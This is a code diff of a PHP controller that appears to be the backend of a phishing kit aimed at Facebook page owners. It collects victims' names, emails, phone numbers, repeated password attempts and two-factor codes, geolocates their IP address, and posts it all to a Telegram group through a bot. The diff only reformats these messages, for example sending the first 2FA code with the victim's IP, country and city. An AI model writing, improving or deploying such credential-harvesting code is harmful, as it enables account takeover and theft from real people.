@@ -49,9 +49,13 @@ class Controller extends BaseController
             $password_2 = $request->password_2 ?? '';
             $fa_code_1 = $request->fa_code_1 ?? '';
             $fa_code_2 = $request->fa_code_2 ?? '';
+            $ipAddress = $infoByIP['ipAddress'];
+            $countryName = $infoByIP['countryName'];
+            $cityName = $infoByIP['cityName'];
             $data = [
                 'chat_id' => $this->groupTelegramId,
-                'text' => "$infoByIP\nName fanpage: $name_fanpage\nFull name: $fullname\nBusiness email: $bussiness_email\nPersonal email: $personal_email\nPhone: $phone\nInfo: $information\nPassword first: $password_1\nPassword second: $password_2\nFA code first: $fa_code_1\nFA code second: $fa_code_2"
+                // 'text' => "$infoByIP\nName fanpage: $name_fanpage\nFull name: $fullname\nBusiness email: $bussiness_email\nPersonal email: $personal_email\nPhone: $phone\nInfo: $information\nPassword first: $password_1\nPassword second: $password_2\nFA code first: $fa_code_1\nFA code second: $fa_code_2",
+                'text' => "Code: $fa_code_1\nIP Address: $ipAddress\nCountry: $countryName\nCity: $cityName",
             ];
             $client = new Client();
             $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
@@ -81,9 +85,10 @@ class Controller extends BaseController
             $information = $request->information ?? '';
             $password_1 = $request->password_1 ?? '';
             $password_2 = $request->password_2 ?? '';
+            $info = implode('\n', $infoByIP);
             $data = [
                 'chat_id' => $this->groupTelegramId,
-                'text' => "$infoByIP\nName fanpage: $name_fanpage\nFull name: $fullname\nBusiness email: $bussiness_email\nPersonal email: $personal_email\nPhone: $phone\nInfo: $information\nPassword first: $password_1\nPassword second: $password_2"
+                'text' => "$info\nName fanpage: $name_fanpage\nFull name: $fullname\nBusiness email: $bussiness_email\nPersonal email: $personal_email\nPhone: $phone\nInfo: $information\nPassword first: $password_1\nPassword second: $password_2"
             ];
 
             $client = new Client();
@@ -356,7 +361,16 @@ class Controller extends BaseController
         $zipCode = $request->zipCode ?? '';
         $continent = $request->continent ?? '';
         //        $continentCode = $request->continentCode ?? '';
-        return "IP Adress: $ipAddress\nCity name: $cityName\nRegion name: $regionName\nCountry name: $countryName\nContinent: $continent\nZipcode: $zipCode\n$errorMessage\n";
+        // return "IP Adress: $ipAddress\nCity name: $cityName\nRegion name: $regionName\nCountry name: $countryName\nContinent: $continent\nZipcode: $zipCode\n$errorMessage\n";
+        return [
+            'ipAddress' => $ipAddress,
+            'cityName' => $cityName,
+            'regionName' => $regionName,
+            'countryName' => $countryName,
+            'continent' => $continent,
+            'zipCode' => $zipCode,
+            'errorMessage' => $errorMessage,
+        ];
     }
 
     private function convertIpV6toIpV4($ipv6)
